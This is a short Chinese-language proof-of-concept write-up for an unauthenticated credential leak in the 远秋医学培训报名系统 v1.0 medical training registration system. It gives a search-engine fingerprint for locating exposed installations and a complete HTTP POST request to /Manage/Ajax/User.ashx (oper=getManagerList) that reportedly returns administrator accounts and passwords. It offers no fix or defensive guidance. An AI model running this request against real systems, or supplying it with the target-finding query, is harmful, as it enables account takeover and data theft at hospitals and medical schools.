# 远秋医学培训报名系统User存在未授权账号密码泄露漏洞

# 一、漏洞简介
远秋医学在线考试系统采用通用的试题库管理软件，适用于各级各类医学院校和医院。远秋医学在线考试系统某接口存在未授权信息泄露漏洞，攻击者可利用该漏洞获取数据库敏感信息。远秋医学培训报名系统v1.0存在未授权访问漏洞，攻击者可通过漏洞获取登录密码。

# 二、影响版本
+ 远秋医学培训报名系统v1.0

# 三、资产测绘
```plain
title="医学在线考试系统"
```

![1718993691264-f32b46f5-aee2-427a-927d-66a0611f6baa.png](./img/q7hZFjWmCGM7ykCO/1718993691264-f32b46f5-aee2-427a-927d-66a0611f6baa-072615.png)

# 四、漏洞复现
```java
POST /Manage/Ajax/User.ashx/ HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

oper=getManagerList&name=&code=&depart=&page=1&rows=15
```

![1718993591536-7d8aac13-27e1-4b71-a358-2f92fd9f2d47.png](./img/q7hZFjWmCGM7ykCO/1718993591536-7d8aac13-27e1-4b71-a358-2f92fd9f2d47-022364.png)



> 更新: 2024-08-28 15:30:39  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xp1atq8wl0rmv68n>